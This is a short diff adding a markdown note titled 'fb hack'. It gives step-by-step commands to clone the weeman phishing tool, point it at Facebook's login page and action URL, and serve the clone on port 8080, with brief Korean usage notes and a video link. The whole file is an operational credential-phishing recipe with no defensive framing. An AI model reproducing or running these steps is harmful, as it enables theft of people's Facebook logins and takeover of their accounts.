@@ -1,0 +1,28 @@
+# fb hack
+
+# weeman download
+$ git clone https://github.com/samyoyo/weeman
+
+$ cd weeman
+$ ./weeman.py
+
+# weeman use
+
+help
+
+show
+
+set url http://www.facebook.com
+
+set action_url http://www.facebook.com/login
+
+set port 8080
+
+run
+
+
+# 사용하기 
+$ ip 와 :포트를 입력해준다.
+
+# 참고 사이트
+- https://www.youtube.com/watch?v=W_M6xrVybKs
